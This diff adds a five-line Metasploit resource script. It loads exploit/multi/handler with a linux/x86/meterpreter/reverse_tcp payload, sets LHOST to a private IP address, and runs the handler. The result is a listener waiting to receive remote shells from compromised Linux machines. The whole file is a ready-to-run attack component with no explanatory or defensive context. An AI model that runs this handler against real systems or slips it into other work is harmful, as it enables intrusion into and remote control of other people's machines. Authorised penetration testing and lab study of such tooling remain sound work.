@@ -1,0 +1,5 @@
+clear
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.49.84.89
+run
